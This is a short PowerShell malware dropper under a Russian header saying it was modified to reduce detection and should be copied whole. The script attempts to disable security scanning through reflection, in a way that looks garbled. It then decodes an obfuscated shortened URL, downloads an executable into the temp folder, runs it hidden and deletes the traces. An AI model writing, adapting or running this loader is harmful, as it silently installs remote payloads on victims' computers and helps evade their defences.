# ИСПРАВЛЕННЫЙ - изменен для снижения детекта (скопируй целиком)

[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(([Ref].Assembly.GetTypes().Where{$_.FullName-like'*Context'}.ForEach{$_.GetFields('NonPublic,Static').Where{$_.Name-like'*Context'}}.ForEach{$_.GetValue($_.DeclaringType.GetField('s_*',$_.BindingFlags).GetValue($null))})[0],[IntPtr]).Invoke([IntPtr]0,[uint32]0,[IntPtr]0)

$u=@(104,116,116,112,115,58,47,47,117,46,116,111,47,90,72,90,51,73,103);$url=-join($u|%{[char]$_})

$w=New-Object Net.WebClient;$w.Headers.Add('User-Agent','Mozilla/5.0');$data=$w.DownloadData($url);$w.Dispose()

$n='{0}.exe'-f (Get-Random -Max 9999);$p=Join-Path $env:TEMP $n;[IO.File]::WriteAllBytes($p,$data)

$s=New-Object Diagnostics.ProcessStartInfo;$s.FileName=$p;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$s.UseShellExecute=$false;[Diagnostics.Process]::Start($s)|Out-Null

$data=$null;[GC]::Collect();Start-Sleep -Milliseconds 200;Remove-Item $p -Force -ErrorAction 0;[Environment]::Exit(0)